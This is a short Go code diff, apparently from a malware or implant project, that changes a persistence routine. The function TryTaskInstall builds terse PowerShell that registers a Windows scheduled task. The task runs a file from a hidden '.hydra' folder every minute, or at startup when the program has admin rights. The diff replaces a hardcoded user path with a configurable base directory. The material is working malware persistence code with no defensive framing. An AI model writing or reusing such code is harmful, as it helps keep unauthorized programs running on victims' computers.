@@ -7,7 +7,7 @@ import (
 )
 
 const (
-	addTaskCmd1 = "$p='%s';$a=New-ScheduledTaskAction -E ($p+(gci -Pa $p -File -Fo)[0].Name);"
+	addTaskCmd1 = "$p='%s/';$a=New-ScheduledTaskAction -E ($p+(gci -Pa $p -File -Fo)[0].Name);"
 	minTrigger  = "$t=New-ScheduledTaskTrigger -RepetitionI (New-TimeSpan -M 1) -O -At (Date);"
 	maxTrigger  = "$t=New-ScheduledTaskTrigger -AtStartup;"
 	addTaskCmd2 = "Register-ScheduledTask -Ac $a -Tr $t -TaskN '%s' -D '%s'"
@@ -16,7 +16,7 @@ const (
 
 //TryTaskInstall attempts to establish persistence by creating a scheduled task.
 func TryTaskInstall() error {
-	pscmd := fmt.Sprintf(addTaskCmd1, "C:/Users/Raffy/Saved Games/.hydra/")
+	pscmd := fmt.Sprintf(addTaskCmd1, Info.Base)
 	if util.RunningAsAdmin() {
 		pscmd += maxTrigger
 	} else {
